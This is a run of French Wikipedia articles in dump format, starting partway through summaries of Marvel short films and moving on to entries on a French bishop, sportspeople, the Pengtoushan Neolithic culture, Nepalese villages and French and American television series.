Avant les événements de "Thor", Phil Coulson fait une halte dans une station-service en se rendant à Albuquerque. Alors qu'il choisit des friandises, deux braqueurs entrent et menacent la caissière. Coulson parvient facilement à prendre le dessus sur les malfrats, les désarmant et les assommant. Il part ensuite après avoir payé et demandé à la caissière de ne pas mentionner sa présence.
"Article 47".
Bennie et Claire, un couple dans une mauvaise passe, a trouvé une arme Chitauri (répertoriée comme "Objet 47") oubliée dans les ruines de New York, dans "Avengers". Le duo utilise la puissance de l'arme pour commettre quelques braquages, qui sont vite remarqués par le SHIELD. Les agents Sitwell et Blake sont alors chargés de récupérer l'arme et de « neutraliser » le couple. Sitwell retrouve le couple dans une chambre de motel, et la rencontre finit en bagarre au cours de laquelle l'argent volé est détruit. Mais au lieu de tuer les deux amants, Sitwell les recute au sein du SHIELD : Bennie au service Recherche et Développement, et Claire comme assistante de Blake.
"Agent Carter".
Un an après "", l'agent Peggy Carter est devenue membre d'une agence d'intervention contre les forces de l'HYDRA, mais ses supérieurs la cantonnent à un poste d'analyste loin du terrain. Une nuit alors qu'elle est seule au bureau, Carter prend un appel lui donnant la localisation du Zodiac. Elle se rend alors sur place et parvient à accomplir la mission en ramenant l'échantillon de sérum. Le lendemain, son supérieur, l'agent Flynn, profond misogyne, la réprimande pour ne pas avoir suivi les procédures et malgré les arguments de Carter et l'urgence de l'intervention, elle n'est à ses yeux que l'amour du Captain qui a eu ce poste pour avoir été prise en pitié. Flynn reçoit juste après un appel : Howard Stark demande que Carter le rejoigne pour diriger le S.H.I.E.L.D avec l'aide de Dum Dum Dugan.
"Longue Vie au roi".
Trevor Slattery, détenu de haute sécurité depuis "Iron Man 3", purge sa peine dans la prison de Seagate. Sa réputation l'a précédé et il vit confortablement, respecté de ses co-détenus qui forment un fan club. Parmi les autres prisonniers, seul Justin Hammer se demande ce qui le rend si spécial. Slattery est contacté par un réalisateur de documentaires, Jackson Norriss, afin de retracer la carrière du Mandarin, telle que vue dans "Iron Man 3". Norriss essaie de comprendre et de connaître Slattery, revenant avec lui sur son passé d'enfant acteur jusqu'à un pilote pour CBS jamais terminé. Norriss finit par révéler que les interventions télévisées de Slattery ont agacé certaines personnes, dont le leader du groupe terroriste des Dix Anneaux, ce que le comédien ignorait totalement. Norriss révèle alors que le Mandarin et le groupe terroriste existent réellement, qu'il en est lui-même membre et qu'il va faire évader Slattery pour lui faire rencontrer le véritable Mandarin. Slattery réalise alors qu'il est dans une situation qui le dépasse complètement.
"Team Thor" (2016).
Après avoir sauvé la Terre avec les Avengers, Thor fait une courte pause en Australie où il vit avec un employé de bureau local, Darryl Jacobson. Il est alors interviewé par une équipe de tournage et parle de sa vie quotidienne en Australie. Thor est vu visitant une classe de maternelle, tentant d'envoyer des emails avec l'aide de Darryl à Tony Stark et Steve Rogers concernant leur conflit, et révélant son conseil d'enquête concernant les liens entre les Pierres d'infinité, les Avengers, Nick Fury, et Thanos. Plus tard, Thor rencontre Bruce Banner dans un café au sujet du fait qu'il n'a pas été contacté par Stark et Rogers. Banner reçoit un appel téléphonique de Stark, qui ne semble pas vouloir tendre la main ou parler à Thor. Thor décide alors de fonder sa propre équipe, la Team Thor, avec Darryl et lui.
"Team Thor: Partie 2" (2017).
Dans la continuité du premier mockumentary, Thor et son colocataire Darryl discutent de leurs responsabilités domestiques dans leur appartement, Darryl étant chargé de la plupart des tâches ménagères. Darryl déclare alors que Thor est une personne gentille mais déconnectée du temps, et devient frustré par les tentatives de Thor de payer le loyer avec la monnaie d'Asgard. Il suggère à Thor de chercher un emploi, ce dont Thor se moque et contrebalance en suggérant qu'ils prennent un domestique. Des images supplémentaires de la visite de Thor dans la classe de maternelle sont montrées. L'interview se termine sur le sentiment de Thor qu'il n'a besoin de personne d'autre dans sa vie que Darryl, et il suggère à Darryl de se procurer une tenue de super-héros.
"Team Darryl" (2018).
Après que Thor ait quitté l'appartement de Darryl, ce dernier déménage à Los Angeles et devient colocataire du Grand Maitres, la seule personne à avoir répondu à ses annonces. Le Grand Maître pense que Darryl serait un bon assistant de remplacement et plusieurs séquences sont montrées où Darryl effectue des tâches subalternes pour le Grand Maître, comme sortir les poubelles et le conduire en voiture. Darryl poursuit en décrivant comment le grand maître semble être une bonne personne, mais qu'il a du mal à comprendre l'espace personnel de Darryl et qu'il a ses propres problèmes de colère. Le Grand Maître déclare qu'il s'est habitué à la Terre et qu'il a l'intention de s'en emparer, avec Darryl à ses côtés. Il crée une vidéo expliquant son plan et la diffuse sur Internet. Cependant, après n'avoir reçu aucune audience, il prévoit de faire de la publicité pour la première vidéo en publiant une seconde vidéo avec un invité musical. Il engage les amis de Darryl pour l'aider, mais fait fondre l'un d'entre eux lorsque ses attentes ne sont pas satisfaites. Darryl avoue qu'il ne sait pas si le Grand Maître veut aussi le faire fondre, et admet que Thor lui manque en tant que colocataire.
"Peter's To-Do List".
Avant son départ pour l'Europe dans , Peter Parker annonce à Ned Leeds qu'il a plusieurs choses à faire avant leur départ. Il se rend d'abord au Delmar's Deli &amp; Grill et achète un adaptateur pour casque audio double afin de pouvoir regarder des films avec Michelle Jones dans l'avion. Il vend ensuite quelques-uns de ses jouets pour gagner de l'argent et offrir un joli bijou à « MJ ». Après avoir récupéré son passeport en utilisant son Spider-Drone pour activer un guichet, Peter Parker se concentre sur sa dernière mission avant de partir. Vêtu de son armure Iron Spider, Spider-Man arrête facilement la famille Manfredi, une organisation criminelle connue. Il utilise les capacités de son armure pour les enserrer et résister aux balles qu'ils tirent sur lui. Une fois la mission accomplie, Spider-Man attend l'arrivée de la police de New York et leur fournit des informations sur les membres du gang. Il plaisante même en disant qu'il fait leur travail. Avant de partir pour son voyage scolaire, Spider-Man promet aux agents de police de prendre un selfie avec eux plus tard.

</doc>
<doc id="7901444" url="https://fr.wikipedia.org/wiki?curid=7901444" title="Charles de La Cropte de Chanterac">
Charles de La Cropte de Chanterac

Charles de La Cropte de Chanterac, né à Chanterac le 6 avril et mort en Espagne le , est un prélat français, dernier évêque d'Alet de 1763 à 1790.
Biographie.
Charles de La Cropte est issu de la même famille noble que la mère de Fénelon, Louise de La Cropte. Charles est le cinquième fils de Gabriel de La Cropte de Chantérac et de Françoise de Bourdeilles, Jean-François de La Cropte de Bourzac, évêque-comte de Noyon est son oncle et le nomme chanoine de son chapitre dès l'enfance. 
Il fait ses études à Paris au séminaire Saint-Sulpice à partir de 1742 puis à la Sorbonne où il obtient son doctorat de théologie. Après son ordination, il est rappelé par son oncle à Noyon pour devenir son vicaire-général. En 1754, il quitte Noyon pour être vicaire général du district de Moulins dans le diocèse d’Autun. Député de la province ecclésiastique à l'assemblée du clergé, le jeune prêtre devient aussi le Superviseur général des Carmélites.
Alors, le cardinal de la Rochefoucauld lui offrit à vie le bénéfice d'une abbaye royale en Artois (revenu annuel évalué à tournois).
Il est nommé évêque-comte d'Alet le , confirmé le 16 mai et consacré le 19 juin par l'archevêque de Paris.
Durant son épiscopat, il se préoccupe des chemins de son diocèse, en particulier il aide financièrement au percement des gorges de la Pierre-Lys réalisé par Félix Armand. 
À la Révolution française, son siège épiscopal est supprimé par la Constitution civile du clergé, il émigre en Espagne le premier septembre 1792 et se retire en Catalogne dans la petite ville Sabadell où il meurt le .
Liens externes.
 

</doc>
<doc id="7901445" url="https://fr.wikipedia.org/wiki?curid=7901445" title="Évêque d'Alet">
Évêque d'Alet



</doc>
<doc id="7901446" url="https://fr.wikipedia.org/wiki?curid=7901446" title="Tenacious D et le médiator du destin">
Tenacious D et le médiator du destin



</doc>
<doc id="7901459" url="https://fr.wikipedia.org/wiki?curid=7901459" title="Syndrome d'alcoolisation fœtale">
Syndrome d'alcoolisation fœtale



</doc>
<doc id="7901465" url="https://fr.wikipedia.org/wiki?curid=7901465" title="Seth Rosin">
Seth Rosin

Seth Rosin (né le à Fargo, Dakota du Nord, États-Unis) est un ancien lanceur droitier de la Ligue majeure de baseball.
Carrière.
Alors qu'il est à l'école secondaire dans le Minnesota en 2007, Seth Rosin est repêché par les Twins du Minnesota au de sélection mais il repousse l'offre pour rejoindre plutôt les Golden Gophers de l'Université du Minnesota. Il est mis sous contrat par les Giants de San Francisco, qui en font leur choix de en 2010. Alors qu'il évolue en ligues mineures, Rosin est transféré aux Phillies de Philadelphie le , avec le voltigeur Nate Schierholtz et le receveur Tommy Joseph en retour du voltigeur Hunter Pence. Rosin passe la saison 2013 à jouer au niveau Double-A des ligues mineures dans l'organisation des Phillies. Le , il est réclamé par les Mets de New York au repêchage de la règle 5 et immédiatement cédé aux Dodgers de Los Angeles. Le , à la fin de l'entraînement de printemps des Dodgers, auquel il participe, Rosin est réclamé au ballottage par les Rangers du Texas.
Seth Rosin fait ses débuts dans le baseball majeur avec les Rangers du Texas le comme lanceur de relève contre Philadelphie. Le suivant, dans un autre match contre les Phillies de Philadelphie, il remporte sa première victoire au plus haut niveau. Le droitier vient lancer dans 3 matchs des Rangers et, en 4 manches, accorde 3 points mérités pour une moyenne de 6,75. Le , Rosin change de club pour la en 4 mois alors que les Rangers le retournent aux Phillies. 

</doc>
<doc id="7901473" url="https://fr.wikipedia.org/wiki?curid=7901473" title="Principe totalitaire">
Principe totalitaire

En mécanique quantique, le principe totalitaire de Gell-Mann s'énonce ainsi : . Il a été formulé en 1956 par le physicien Murray Gell-Mann afin de décrire l'état de la physique des particules à l'époque où il formulait la voie octuple.
L'affirmation fait référence à un aspect surprenant de l'interaction entre les particules : toute interaction qui n'est pas interdite n'est pas seulement permise, mais possède une certaine probabilité de se produire. 
Selon la théorie d'Everett, le principe a une signification plus littérale : toute interaction qui n'est pas interdite se produira, à un endroit ou à un autre de la fonction d'onde.
Origine de l'expression.
Un des plus anciens principes du droit anglais affirme « » "(Everything which is not forbidden is allowed)". Cela signifie que dans un pays relativement libre, la loi précise tout ce qui est interdit, et pour tout ce qui n'est pas mentionné, les individus sont libres de le faire ou pas.
Le principe totalitaire est énoncé dans l’œuvre "" de T.H. White, pour montrer ce qu'est une inversion totale de la liberté : la loi ne définit plus que des comportements interdits ou obligatoires, mais en aucun cas ne laisse les individus libres de choisir.
Utilisation pour le tachyon.
Le principe totalitaire a été repris par Olexa-Myron Bilaniuk et George Sudarshan pour justifier leurs recherches approfondies concernant le tachyon.
En effet, les équations de la relativité restreinte permettent formellement aux particules de se déplacer, soit moins vite que la lumière, soit exactement à cette vitesse, soit "plus vite que la lumière", mais jamais de passer d'une catégorie à l'autre. L'application du principe totalitaire amène à supposer que les particules plus rapides existent, alors que jusque-là seules les deux autres catégories ont été observées.

</doc>
<doc id="7901479" url="https://fr.wikipedia.org/wiki?curid=7901479" title="Culture de Pengtoushan">
Culture de Pengtoushan

La culture de Pengtoushan (chinois traditionnel : 彭頭山文化 ; chinois simplifié : 彭头山文化 ), datée de avant l'ère commune (AEC), est une culture de transition vers le Néolithique, qui s'est développée dans le Sud de la Chine. Elle a été mise au jour sur deux sites principaux, Pengtoushan et Bashidang, sur le cours moyen du Yangzi Jiang, dans le Nord du Hunan. Cueillette et chasse étaient complétées par quelques animaux domestiqués et par la culture d'un riz spécifique, sans rapport avec les riz modernes. De nombreux autres sites assimilés à cette culture ont été identifiés depuis 1984-1988, dates des premières découvertes. Ces cultures précèdent la culture du bas Zaoshi (v. 5 800 - 5 500 AEC), appelée aussi simplement culture de Zaoshi, du Néolithique moyen, qui a été elle-même suivie par la culture de Daxi (v. 5 000 - 3 300) et de Qujialing (v. 3 400 - 2 500) - Shijiahe (v. 2 200 - 2 000), du néolithique final.
Historique.
Une campagne de prospection en 1984 a révélé l'existence de la culture de Pengtoushan. La fouille de 1988 a été déterminante pour nommer cette nouvelle culture du nom du site principal : « Pengtoushan ».
Localisation.
Situés au Nord-Ouest du lac Dongting, sur les berges nord de la rivière Li (Lishui), les sites de Pengtoushan et de Bashidang sont voisins. Pengtoushan est à . au-dessus de la plaine alluviale sur une petite colline, tandis que le site de Bashidang est entre les bras de la rivière sur les faces nord et ouest et protégé par des murs de terre (. à la base) et par un fossé (le plus profond de ) sur les côtés est et sud. Les murs n'étant pas damés mais simplement le résultat de l'entassement de la terre extraite des fossés. Leurs formes ont été remaniées au cours des temps.
Plus d'une vingtaine de sites ont été identifiés et on a effectué une fouille de quelques-uns d'entre eux : Bashidang (situé avec Pengtoushan dans le xian de Li, au Hunan), Huangjiayuan (région de la ville de Miluo), Chengbeixi et Zhichengbei (région de la ville de Zhicheng, non loin de là, sur les berges du Yangzi). Mais les informations essentielles proviennent de Pengtoushan et Bashidang.
Chronologie.
La culture de Pengtoushan a été précédée dans cette région par une culture du Paléolithique final.
Le site de Pengtoushan correspond à la première phase de la période ancienne de cette culture. Cette première phase se trouve sur une zone limitée, en majorité dans la plaine de Liyang au nord-ouest du Hunan, qui compte de nombreuses rivières et des lacs. Tandis que le site de Bashidang couvre la seconde et dernière phase de la période ancienne ainsi que la période récente; ce site s'inscrit dans une extension de la culture de Pengtoushan sur trois zones : vers l'Est (les berges sud-est du lac Dongting), l'Ouest (le nord-ouest du lac avec les sites de Pengtoushan et Bashidang), et le Nord (le long du Yangzi, au Hubei, et avec le site de Chengbeixi). La période ancienne correspond approximativement à 7 150 - 5 150, la période récente à 5 150 - 4 850 AEC.
Mode de subsistance.
L'acidité du milieu de Pengtoushan n'a permis la conservation que de quelques éléments organiques. Cependant des grains de riz carbonisés dans la céramique en tant que dégraissant de la terre ont été préservés comme sur le site de Bashidang. Sur ce dernier site, à côté de ces restes conservés dans la céramique, ce sont des milliers de grains de riz qui ont été découverts sur la rive en pente d'un ancien lit du Yangzi, en 1996-1997. Les grains trouvés dans ce lieu précis ont souvent conservé leurs deux glumelles, coriaces et adhérentes, l'ensemble formant du riz complet. Mais la comparaison avec divers riz modernes semble prouver que l'on a affaire ici à un riz propre à cette région et à cette époque. En tout cas une telle abondance de riz cultivé indique que la domestication du riz était en cours. 
L'étude des restes consommés à Pengtoushan montre que les produits de la chasse sont plutôt limités comparativement aux produits de la pêche et à l'élevage d'animaux domestiqués. Bashidang n'a donné que quelques espèces chassées, essentiellement le cerf élaphe (cerf) et le cerf aboyeur (muntjac), et en petit nombre seulement. La pêche devait être abondante parmi ces cours d'eau et ces lacs. En complément le porc, le poulet et le buffle d'eau étaient domestiqués. Les os du buffle d'eau servant à de nombreux usages, mais probablement aussi les nerfs et la peau qui ne se sont pas conservés.
La collecte de plantes sauvages reste une activité importante : c'est l'autre conclusion de cette étude. Ce sont essentiellement des plantes aquatiques : la châtaigne d'eau , les racines de lotus et le nénuphar épineux. Bien que le riz ait été significatif ici, et une plante cultivée, on ne peut guère être sûr qu'il ait été la plante la plus consommée.
Habitat.
Le site de Pengtoushan couvre , celui de Bashidang . À Pengtoushan une fouille de a permis de dégager six habitations, certaines au niveau du sol et d'autres semi-enterrées. Le site de Bashidang, à seulement d'altitude, est un site de la plaine de Liyang. C'était à l'époque un lieu légèrement surélevé dans le paysage, au-dessus de ce bras de rivière et le fossé qui était en connexion avec la rivière aurait pu servir de canal de drainage, parfois à sec. Les restes de l'enclos ont une épaisseur de . et ne montent qu'à . Ce mur aurait pu servir de protection en cas d'inondation lors des moussons. Un chemin surélevé traversait le village, partiellement pavé pour lutter contre l'érosion.
Trois types d'habitations ont été construits : des palafittes ("ganlanshi") sur pilotis, des maisons construites au niveau du sol ("dimian"), et des maisons semi-enterrées ("bandixue"). Les maisons sur pilotis étant les plus nombreuses. L'habitation de type "dimian" la plus grande mesure . , avec une fondation creusée sur une dizaine de centimètres. Elles semblent avoir été plus ou moins rectangulaires. Les rares habitations semi-enterrées pourraient n'avoir été construites que pendant des périodes plus sèches et leurs formes sont plutôt rondes, ovales ou même en étoile, un cas unique, avec quatre entrées.
Sépultures.
On ne trouve pas de cimetière dans un lieu spécifique. Quelques tombes se sont trouvées être disposées en dehors de l'enclos-fossé, mais la plupart se trouvent près des habitations. La nature du terrain n'a pas permis la préservation des restes humains. Les inhumations sont presque toutes secondaires, les ossements ayant été rassemblés dans des tombes de faible dimension, des fosses de section rondes ou carrées et entre 50 et de longueur. Les offrandes funéraires sont rares : une tombe secondaire de Pengtoushan contient quatre poteries, leur état plus ou moins brisé provenant du déplacement hors du premier lieu d'inhumation. Ces premières inhumations sont rares et les squelettes conservés bien peu nombreux. La longueur de la tombe voisinant les à . Un site de Pengtoushan a livré une seule tombe contenant cinq billes de pierre. Une tombe de Bashidan a livré trois vaisselles de céramique, et fait unique, elle contenait aussi une agate, ronde et rose, d'environ de diamètre. Était-ce la tombe d'une femme ? 
Aucune marque de différenciation sociale n'étant mentionnée, c'est apparemment une société sans hiérarchie différenciée. 
Autres pratiques sociales.
Une curieuse structure dans une construction semi-enterrée datant de la phase finale de la première période a été composée à proximité du fossé de Bashidang : sur une plate-forme de de haut à laquelle on accède par quatre rampes inclinées. Au centre un trou de de diamètre a été creusé afin de recevoir un poteau. Le maxillaire d'un buffle d'eau ayant été déposé au fond du trou qui a reçu le poteau. Puis le trou a été comblé de terre. S'agirait-il d'un « autel » ? Enfin, sur le site de Bashidang, la découverte de cette très grande quantité de riz complet, bien sûr non consommé, dans cet ancien bras de la rivière pourrait indiquer une pratique rituelle, une offrande à la rivière divinisée, pour la protection de la communauté.
Les objets.
Céramique.
Les céramiques sont de forme simple : la jarre (de type "guan") domine avec sa silhouette globulaire déclinée sous forme de chaudron ou de bouteille à oreille verticales percées pour la corde de suspension, les bols ("bo"), les plats ("pan") et les supports de chaudron ("zhizuo") . La technique de modelage en partant d'une plaque donne des parois d'épaisseur inégale et le dégraissant de fibre végétale est le plus utilisé. Ce type de forme semble indiquer des poteries conçues pour être pratiques lors des déplacements.
Outils.
Les outils de pierre sont en majorité des "choppers" issus de blocs roulés par la rivière, des silex taillés et seulement 1 % de pierre polie. Ce qui est en continuité avec la tradition locale de la fin du Paléolithique, correspondant à une économie de prédation : pour l'essentiel les populations de la culture de Pengtoushan sont des chasseurs-cueilleurs.
Le site de Bashidang a permis de rassembler des objets peu ordinaires : bêches en bois et en os, plantoirs durcis au feu, perle de turquoise, statuette (env. de long) en forme de tête, nattes et paniers en roseau tressé et des morceaux de cordes, en fibres végétales (pour suspendre une jarre), en chanvre et en rotin de vigne . Deux singulières petites tablettes de bois (environ 20 x , avec des trous en divers endroits) y ont été aussi découvertes, et restent énigmatiques bien que certains s'accordent pour y voir des instruments permettant de porter des informations ou liés à la divination. On a découvert enfin des objets en bois qui ressemblent à des toupies (10 x ), quelque peu comme celles trouvées sur le site de Hemudu (vers 5 500 - 3 300), mais leur fonction reste obscure.
Cultures connexes.
Culture de Chengbeixi-Zhichengbei (v. 6 500 - 5 000 AEC).
Cette culture peut être considérée comme une extension de la culture de Pengtoushan vers le Nord, au Hubei, le long du Yangzi.
Contemporaine de Pengtoushan et Zaoshi, elle apparaît sur une dizaine de petits sites non loin de zones montagneuses le long du cours moyen du Yangzi Jiang . Les sites se présentent dans des configurations géographiques diverses : certains tout près du fleuve, à basse altitude, (c'est le cas du site éponyme de Chengbeixi) en zone inondable pendant la saison des pluies. Dans quelques restes d'habitation on a trouvé des traces de la faune : buffles, daims, et plusieurs espèces de poissons et de coquillages. Il s'agirait de campements saisonniers, pendant la période des basses-eaux. D'autres sites dominent d'une quinzaine, voire une vingtaine de mètres le paysage environnant, et occupés le reste du temps.
La céramique se limite à des jarres globulaires, leurs supports, et des bols, des plats, durant la phase la plus ancienne. Au cours des phases suivantes on voit apparaitre des plats (20-) à base circulaire, incisée et/ou perforée d'éléments décoratifs géométriques, recouvert d'engobe rouge ou blanc, des poteries peintes et des céramiques noires et polies. La terre y est toujours montée par modelage et les dégraissants peuvent être du sable, des coquillages et des plantes, comme le riz. Le matériel lithique est surtout constitué de pierres taillées tirées des galets : haches, herminettes, faucilles, grattoirs et des lests pour la pèche, des hachoirs et des balles. Certaines parties, ou certaines pièces ayant fait l'objet d'un polissage. C'est le matériel-type de chasseurs-cueilleurs mobiles. Les grains de riz pourraient provenir d'échanges avec d'autres communautés.
Culture du bas Zaoshi (v. 5 800 - 5 500 AEC).
Plusieurs sites (tous très voisins de la culture de Pengtoushan) sont concernés . Le sol des habitations du site de Hujiawuchang est fini par des couches de divers fragments : des déchets de terre cuite, du sable, des fragments de pierre et de céramique. La céramique s'est diversifiée. Certaines assiettes ont un pied couvert d'un décor gravé, plus ou moins profondément Alors que la majorité en est encore composé de terre à dégraissant de fibres et montée par simple modelage, certaines pièces de vaisselle ont des parois plus fines, sont finies par une couche d'engobe blanche, ou constituées d'une céramique blanche. La pierre taillée domine très largement, à côté de quelques pierres polies, principalement pour le travail du bois. On a bien trouvé des grains de riz carbonisés à côté de racines de lotus, des prunes, des pêches de montagne des cerises et des kakis. Avec les produits de la chasse et de la pèche, des coquillages, les habitants élevaient aussi des porcs domestiques.
La néolithisation y semble plus engagée. Cette culture est apparue après celles de Houli (6 500 - 5 500), et Peiligang (v. 7 000 - 5 000) - Cishan-Beifudi (vers 6 500 - 5 000), et toutes s'achèvent dans la même période, vers 5 500 - 5 000 AEC.

</doc>
<doc id="7901485" url="https://fr.wikipedia.org/wiki?curid=7901485" title="Ekaterina Yurlova-Percht">
Ekaterina Yurlova-Percht

Ekaterina Viktorovna Yurlova-Percht (en ), née le à Léningrad (Saint-Pétersbourg), est une biathlète russe, championne du monde de l'individuel en 2015.
Carrière.
Entrainée par son père Victor, Yurlova fait ses premiers pas sur la scène internationale aux Championnats d'Europe junior 2006.
Elle fait ses débuts en Coupe du monde en mars 2008 à Khanty-Mansiïsk après de bonnes performances en IBU Cup, où elle obtient son premier podium fin 2009. Elle fait son retour en Coupe du monde en 2009-2010, marquant ses premiers points à ce niveau. Début 2011, Yurlova signe ses premiers "top" dix en Coupe du monde à Oberhof, dont une sixième place sur le sprint. Puis elle participe aux Championnats du monde 2011 à Khanty-Mansiïsk, en Russie, récoltant trois nouveaux "top" dix, dont une sixième place au sprint. Elle finit ensuite du classement général de la Coupe du monde.
En 2015, elle crée la surprise en remportant le titre de championne du monde de l'individuel à Kontiolahti grâce à un 20 sur 20 au tir, la première victoire de sa carrière. Durant cette saison 2014-2015, elle participait pourtant essentiellement au circuit IBU Cup. Sur cette dynamique, elle empoche l'année suivante une troisième place sur le sprint d'Antholz, avant de gagner la poursuite.
Absente du circuit lors de la saison 2016-2017 pour cause de maternité, Yurlova doit attendre décembre 2018 pour retrouver le podium : elle se classe troisième du sprint de Coupe du monde à Hochfilzen. En janvier 2019, elle s'impose avec ses coéquipières en relais à Oberhof.
Après un titre aux Championnats d'Europe sur la poursuite, Yurlova gagne la médaille d'argent sur la "mass start" des Championnats du monde 2019, derrière la future gagnante de la Coupe du monde, Dorothea Wierer. 
Le nom Percht vient de son mariage avec le physiothérapiste de l'équipe autrichienne Josef Percht. Ils ont un enfant, né en 2016.

</doc>
<doc id="7901491" url="https://fr.wikipedia.org/wiki?curid=7901491" title="Paulo Nagamura">
Paulo Nagamura

Paulo Nagamura est un footballeur brésilien d’origine japonaise, né le à São Paulo. Il joue au poste de milieu de terrain et s'est reconverti comme entraîneur.
Biographie.
Carrière de joueur.
Né à São Paulo, Paulo Nagamura est formé dans le club de sa ville natale, le São Paulo FC. En 2001, il est transféré à Arsenal où il joue avec les équipes de jeunes et ne participe qu'à une rencontre amicale avec l'équipe première.
En 2005, il signe finalement son premier contrat professionnel et rejoint le Galaxy de Los Angeles en Major League Soccer.
Le , il est transféré au Sporting de Kansas City en échange d'un choix de repêchage lors de la MLS Supplemental Draft 2012.
Carrière d'entraîneur.
Après sa carrière de joueur conclue au Sporting de Kansas City, Paulo Nagamura est nommé entraîneur de l'équipe réserve le . Il reste en poste pendant quatre saisons avant de quitter le club le . Il retrouve finalement la Major League Soccer lorsqu'il est embauché pour devenir l'entraîneur du Dynamo de Houston le . Sa première saison en poste à Houston est difficile et alors que son équipe occupe le dernier rang de la conférence Ouest, il est démis de ses fonctions le .

</doc>
<doc id="7901497" url="https://fr.wikipedia.org/wiki?curid=7901497" title="Tatopani (Surkhet)">
Tatopani (Surkhet)

Tatopani (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7901500" url="https://fr.wikipedia.org/wiki?curid=7901500" title="Neil Adams">
Neil Adams

Neil Adams (né le ) est un judoka britannique. Il participe aux Jeux olympiques d'été de 1980 et aux Jeux olympiques d'été de 1984. En 1980, il combat dans la catégorie des poids légers et remporte la médaille d'argent. En 1984, il combat dans la catégorie des poids mi-moyens et remporte également la médaille d'argent. Au cours de sa carrière sportive, Neil Adams est monté à quatre reprises sur un podium mondial (1979, 1981, 1983 et 1985) et à huit reprises sur un podium européen (1977, 1978, 1979, 1980, 1982, 1983, 1984, et 1985).

</doc>
<doc id="7901501" url="https://fr.wikipedia.org/wiki?curid=7901501" title="Tyler Collins">
Tyler Collins

Tyler James Collins (né le à Lubbock, Texas, États-Unis) est un voltigeur des Tigers de Détroit de la Ligue majeure de baseball.
Carrière.
Tyler Collins est repêché en par les Tigers de Détroit en 2011. Parallèlement à son parcours en ligues mineures dans l'organisation des Tigers, Collins évolue durant l'hiver 2011-2012 avec les Blue Sox de Sydney de la Ligue australienne de baseball. Il est invité au match d'étoiles de la ligue en au Barbagallo Ballpark de Perth et est nommé meilleur joueur de la partie qui est gagnée 8-5 par les étoiles de l'« équipe mondiale », dont Collins fait partie, sur l'équipe nationale d'Australie.
Après avoir joué toute la saison 2013 au niveau Double-A des ligues mineures chez les SeaWolves d'Érié, un club-école des Tigers de Détroit, Collins gradue au niveau majeur en 2014. Il dispute son premier match dans le baseball majeur le alors qu'il est appelé à servir de coureur suppléant dans une rencontre contre les Royals de Kansas City. Il réussit son premier coup sûr chez les Tigers le suivant aux dépens du lanceur Paco Rodriguez des Dodgers de Los Angeles. Après quelques matchs joués en tout début d'année, il revient chez les Tigers en septembre après la fin de la saison des ligues mineures. Il frappe son premier coup de circuit dans les majeures le aux dépens du lanceur Austin Adams des Indians de Cleveland.

</doc>
<doc id="7901502" url="https://fr.wikipedia.org/wiki?curid=7901502" title="Tatopani">
Tatopani

Tatopani peut faire référence à :

</doc>
<doc id="7901507" url="https://fr.wikipedia.org/wiki?curid=7901507" title="Songwriter">
Songwriter

 est un film américain réalisé par Alan Rudolph, sorti en 1984.

</doc>
<doc id="7901512" url="https://fr.wikipedia.org/wiki?curid=7901512" title="Trouble du spectre de l'alcoolisation fœtale">
Trouble du spectre de l'alcoolisation fœtale



</doc>
<doc id="7901516" url="https://fr.wikipedia.org/wiki?curid=7901516" title="Dasarathpur">
Dasarathpur

Dasarathpur (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7901518" url="https://fr.wikipedia.org/wiki?curid=7901518" title="Sabrina, l'apprentie sorcière (série télévisée d'animation, 2013)">
Sabrina, l'apprentie sorcière (série télévisée d'animation, 2013)

Sabrina, l'apprentie sorcière ("") est une série télévisée d'animation américaine en 26 épisodes de 25 minutes développée par Pamela Hickey et Dennys McCoy et diffusée entre le et le sur .
C'est une adaptation de la série de comics "Sabrina, l'apprentie sorcière" de l'éditeur Archie Comics. C'est la dixième adaptation télévisée des aventures de Sabrina et la cinquième en série d'animation.
En France, en Suisse et en Belgique la série est diffusée depuis le sur Disney Channel. Elle reste inédite au Québec.
Synopsis.
Sabrina Spellman n'est pas une fille comme les autres : elle est une sorcière. Elle vit dans le monde des mortels avec ses deux tantes sorcieres et dans le monde des sorciers. Mais Enchantra, la puissante sorcière qui dirige son école du monde des sorciers, veut qu'elle reste pour toujours dans le monde magique et pour ce faire, elle envoie Salem en chat.

</doc>
<doc id="7901526" url="https://fr.wikipedia.org/wiki?curid=7901526" title="Imogène (série télévisée)">
Imogène (série télévisée)

Imogène est une série télévisée française en treize épisodes de 90 minutes tournée à Locquénolé, créée par Michel Grisolia et Martin Lamotte, diffusée entre le et le sur TF1. Personnage de littérature né de l'esprit de Charles Exbrayat, il est interprété par Dominique Lavanant durant les 13 épisodes que compte ce grand succès populaire de la télévision.
Synopsis.
Imogène Le Dantec est la fille du célèbre amiral, héros de la bataille de l’Atlantique pendant la Seconde Guerre mondiale. Au décès de son père, elle s’installe à Paris où elle travaille comme secrétaire au ministère de la Marine. Mais un beau jour, une mission secrète que lui confie son supérieur l’entraîne à Plouguirec, petit port breton où Imogène a passé une bonne partie de son enfance. Plouguirec est un charmant village de la côte nord du Finistère, dans l’arrondissement de Morlaix. Elle y retrouve alors Maryvonne, son ancienne nourrice, dans la maison de son père, le "Kerbiniou". Imogène, Bretonne célibataire et fantasque, fourre son nez partout et doit faire face à l’adjudant-chef Trouillet qui ne pense qu'à une chose, l'inculper coûte que coûte et à défaut, la devancer dans la résolution d'affaires. À noter que les intrigues des différents épisodes vont du "meurtre de proximité" à la résolution d'affaires regardant la Défense Nationale. Enfin, certaines aventures entraînent Imogène, Gwendoline, Trouillet et Quemeneur dans le Cotentin, ainsi qu'en Île-de-France dont à Paris.
Épisodes.
1- "Ne vous fâchez pas Imogène !" (1989).
Imogène vit à Plouguirec, en Bretagne, où elle veille sur son père, l'amiral Le Dantec, héros de la dernière guerre. Lorsque celui-ci vient à mourir, Imogène fait ses valises et part s'installer à Paris. Elle trouve un poste de secrétaire au ministère de la Marine et s'y ennuie ferme, jusqu'au jour où elle est convoquée par son directeur. Après lui avoir reproché son franc-parler et son mauvais caractère, il lui confie une mission délicate : transporter de Paris à Plouguirec un colis contenant un échantillon d'un métal révolutionnaire, destiné aux sous-marins atomiques basés à Brest. Sur place, elle sera contactée par un mystérieux agent, auquel elle devra remettre le précieux colis.
Réalisateur.
François Leterrier
Scénariste.
Martin Lamotte
diffusion.
 sur TF1
2- "Imogène est de retour..." (1990).
